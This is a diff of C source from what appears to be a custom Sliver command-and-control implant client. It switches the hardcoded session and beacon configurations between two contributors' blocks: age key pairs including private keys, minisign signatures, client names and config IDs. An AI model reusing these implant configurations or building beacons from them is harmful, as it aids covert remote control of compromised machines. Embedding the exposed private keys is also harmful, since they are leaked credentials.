@@ -1987,46 +1987,45 @@ VOID Final(VOID)
 	CHAR szSliverClientName[] = "SOFT_TUNIC";
 	CHAR szConfigId[] = "e3db8606-9375-4678-82ad-954b426e1186";
 #elif _SESSION
-	// From Tu Dinh
-	/*PSLIVER_SESSION_CLIENT pSessionClient = NULL;
-	CHAR szRecipientPubKey[] = "age15tmzalnatxxuun3x6s6x0klvyyqd5dzen252e346655yfdq8juqqaktwxl";
-	CHAR szPeerPubKey[] = "age1p6yn2nngy5up5mwy9cl98k9g3v4e80j7vuca20046nr2cny6n46q0yu0dr";
-	CHAR szPeerPrivKey[] = "AGE-SECRET-KEY-1EHFACCLHSDQK02CTA7DWEA7ZH3A7S67Z4VD26YDWZW2RFSJN947SRKP6FG";
-	CHAR szServerMinisignPubkey[] = "untrusted comment: minisign public key: F9A43AFEBB7285CF\nRWTPhXK7/jqk+fgv4PeSONGudrNMT8vzWQowzTfGwXlEvbGgKWSYamy2";
-	UINT64 uEncoderNonce = 13;
-	CHAR szSliverClientName[] = "LUCKY_BRASSIERE";
-	CHAR szConfigId[] = "2fcc56b8-fbf9-4c3f-99be-d7ba7f2ab289";
-	DWORD dwMaxFailure = 5;
-	DWORD dwReconnectInterval = 600;*/
-
 	// From Phan Chu Trinh
 	PSLIVER_SESSION_CLIENT pSessionClient = NULL;
+	CHAR szRecipientPubKey[] = "age15tmzalnatxxuun3x6s6x0klvyyqd5dzen252e346655yfdq8juqqaktwxl";
+	CHAR szPeerPubKey[] = "age1tcyjf48h55y58xcamwsacazg09p8hcsavhsgfjayavcd7wyc6agsldvken";
+	CHAR szPeerPrivKey[] = "AGE-SECRET-KEY-1A9QJL6AHV9P5XPKJNHF6KXN7JAHEXTD87VKMCR38TFPTQYXZC3TQKVMNZ7";
+	CHAR szServerMinisignPubkey[] = "untrusted comment: minisign public key: F9A43AFEBB7285CF\nRWTPhXK7/jqk+fgv4PeSONGudrNMT8vzWQowzTfGwXlEvbGgKWSYamy2";
+	CHAR szSliverClientName[] = "DECISIVE_FERRY";
+	CHAR szConfigId[] = "9ecd4772-22ed-428d-be07-a2579092f740";
+	CHAR szPeerAgePublicKeySignature[] = "untrusted comment: signature from private key: F9A43AFEBB7285CF\nRWTPhXK7/jqk+VacFX4iBgo3Zwwg5BZqS0vyFxr90q+W+jo0MLcsayVA3HjxsEpDDUkKELnT2i3Ivk+vBINWYqp5RoHjaIFRigg=\ntrusted comment: timestamp:1730336915\n38cF8Sf7WKAu2C73d/YA0nGC7tEoRz8qzfO1cSYa96aPtAoxi8Cua8Z2GUY1p7H7kouOlDrH6yiir2M/NpPRAQ==";
+
+	// From Tu Dinh
+	/*PSLIVER_SESSION_CLIENT pSessionClient = NULL;
 	CHAR szRecipientPubKey[] = "age15tmzalnatxxuun3x6s6x0klvyyqd5dzen252e346655yfdq8juqqaktwxl";
 	CHAR szPeerPubKey[] = "age1dr6wu66ys8xw77ntv3c5323juar0mu3pfzh3w8keu7r26szctenq9ml0y9";
 	CHAR szPeerPrivKey[] = "AGE-SECRET-KEY-1WMHCENFT9V35KGJL7AC79LQ7YU595YYKYDZU4N5RXSDTVMK9KJ7SKS9GX0";
 	CHAR szServerMinisignPubkey[] = "untrusted comment: minisign public key: F9A43AFEBB7285CF\nRWTPhXK7/jqk+fgv4PeSONGudrNMT8vzWQowzTfGwXlEvbGgKWSYamy2";
 	CHAR szSliverClientName[] = "PLASTIC_DATABASE";
 	CHAR szConfigId[] = "8001d686-212d-42b6-a86f-0a9681cf2fe9";
-	
-	CHAR szPeerAgePublicKeySignature[] = "untrusted comment: signature from private key: F9A43AFEBB7285CF\nRWTPhXK7/jqk+Uq5ZWjBjIeNjPAooGy+Gpce+sumpkwtSKhq1bumFSaTBscU1U935RabU7M+oII4JtgB37MnzuaBIG81eUG2VQA=\ntrusted comment: timestamp:1730113878\nCo1qxEq5AOdhuc1ZhSdRGUB58roaBdKF/og6W/2g/3g2s0jpXWyqmVNwXLHszJdFl78diQ15qd1KmmWPRRdmAw==";
+	CHAR szPeerAgePublicKeySignature[] = "untrusted comment: signature from private key: F9A43AFEBB7285CF\nRWTPhXK7/jqk+Uq5ZWjBjIeNjPAooGy+Gpce+sumpkwtSKhq1bumFSaTBscU1U935RabU7M+oII4JtgB37MnzuaBIG81eUG2VQA=\ntrusted comment: timestamp:1730113878\nCo1qxEq5AOdhuc1ZhSdRGUB58roaBdKF/og6W/2g/3g2s0jpXWyqmVNwXLHszJdFl78diQ15qd1KmmWPRRdmAw==";*/
 #else
-	// From Tu Dinh
-	/*PSLIVER_SESSION_CLIENT pSessionClient = NULL;
-	CHAR szPeerPubKey[] = "age1k7qh27zf9v4d3ystvlkdzaxlpn4fs5zgntxfzwraqj2gk6xl0e3ssdzhjy";
-	CHAR szPeerPrivKey[] = "AGE-SECRET-KEY-1JEE7U0JL58FKMEXY3U5WP2KJ2V2Q8AJNG7TSL7HN8KH0Y8HWASJQ2HVZ6S";
-	CHAR szRecipientPubKey[] = "age1urmls5nq4m8px0u5gscz7wyf04j8qk7mr8tcm5tn9fxym4p8l5wqwuzjjh";
-	CHAR szServerMinisignPubkey[] = "untrusted comment: minisign public key: F9A43AFEBB7285CF\nRWTPhXK7/jqk+fgv4PeSONGudrNMT8vzWQowzTfGwXlEvbGgKWSYamy2";
-	CHAR szPeerAgePublicKeySignature[] = "untrusted comment: \nRWTPhXK7/jqk+aZEopilp1prxuEKzrnfgQR3yxMHsCVAsLe+VAMy7OmKpgePtSriqTmwOMdhkTy0pFpJgwIChwCP0BnNS0DG0gI=\ntrusted comment: 1729822855\n0yadVaLH3tNnDhUQLVkkd8oZwIG48QH8YmH2a+HXiYAvvoA4slwQFP+35kphcOuh4+8ZzZS1o8nwp+mQg7jWDw==";*/
-
 	// From Phan Chu Trinh
 	PSLIVER_SESSION_CLIENT pSessionClient = NULL;
+	CHAR szPeerPubKey[] = "age15m9jy6r9m7296x0m4azhp06883llkw8kpyzs64mte5rv5s5zrf6qz2hmse";
+	CHAR szPeerPrivKey[] = "AGE-SECRET-KEY-15T653732A6NJFGP0RCUL3UUEE0JY0D9YRRL0WJ5T697SZSULA4WSL4KEV2";
+	CHAR szRecipientPubKey[] = "age15tmzalnatxxuun3x6s6x0klvyyqd5dzen252e346655yfdq8juqqaktwxl";
+	CHAR szServerMinisignPubkey[] = "untrusted comment: minisign public key: F9A43AFEBB7285CF\nRWTPhXK7/jqk+fgv4PeSONGudrNMT8vzWQowzTfGwXlEvbGgKWSYamy2";
+	CHAR szPeerAgePublicKeySignature[] = "untrusted comment: signature from private key: F9A43AFEBB7285CF\nRWTPhXK7/jqk+W4BCidBiGftXn3B5BhF2iTvOKLITSXl8VuKkPw/0kWDwiDbrkvg9jbNmZD1bAkFCUpMtvri+4OsKLESnwmDuAs=\ntrusted comment: timestamp:1730337887\nxCTWnliJrfPawWnUmTY2P7ccJRZSa6LnyjMEdZCgEhef02WbBJh8RfMsz/I/ZrmPtpCNc1F4n2U+kghilIuzDA==";
+	CHAR szSliverClientName[] = "TECHNICAL_FORAY";
+	CHAR szConfigId[] = "5559e761-e90c-4b5e-893d-58eb247aa086";
+
+	// From Tu Dinh
+	/*PSLIVER_SESSION_CLIENT pSessionClient = NULL;
 	CHAR szPeerPubKey[] = "age1kcgw9sshhgjl99gtdqg5crtlx9e9dgnm688j9ce98pcz6dwt73zs6jj4nm";
 	CHAR szPeerPrivKey[] = "AGE-SECRET-KEY-1KJ8M0NGRMJ90W2U08LVJLLA848TKXP6QKTH30STS3NHXV5MEDJ4Q95FZUM";
 	CHAR szRecipientPubKey[] = "age15tmzalnatxxuun3x6s6x0klvyyqd5dzen252e346655yfdq8juqqaktwxl";
 	CHAR szServerMinisignPubkey[] = "untrusted comment: minisign public key: F9A43AFEBB7285CF\nRWTPhXK7/jqk+fgv4PeSONGudrNMT8vzWQowzTfGwXlEvbGgKWSYamy2";
 	CHAR szPeerAgePublicKeySignature[] = "untrusted comment: signature from private key: F9A43AFEBB7285CF\nRWTPhXK7/jqk+R1arZLraIBUFzy0FUA0fqQpdqqvpOtaYQ4T6EQa9BWN6G096nSfuMikQayWIdxsyc0/cqy0hppjz8NPqZbl+g4=\ntrusted comment: timestamp:1730114144\nkpsqCc+x7Ag2kVnhTXSuhY4VJkI/KGV5KR6unjmlYUEEKTP9z5UZc+8Rtxir2/QqLV+gJOj6JY+xXMpb0mytDA==";
 	CHAR szSliverClientName[] = "WORRIED_ABDOMEN";
-	CHAR szConfigId[] = "018dbe78-4ee7-4ab2-a49a-fa1feb2dab74";
+	CHAR szConfigId[] = "018dbe78-4ee7-4ab2-a49a-fa1feb2dab74";*/
 #endif
 
 #ifndef _DEBUG
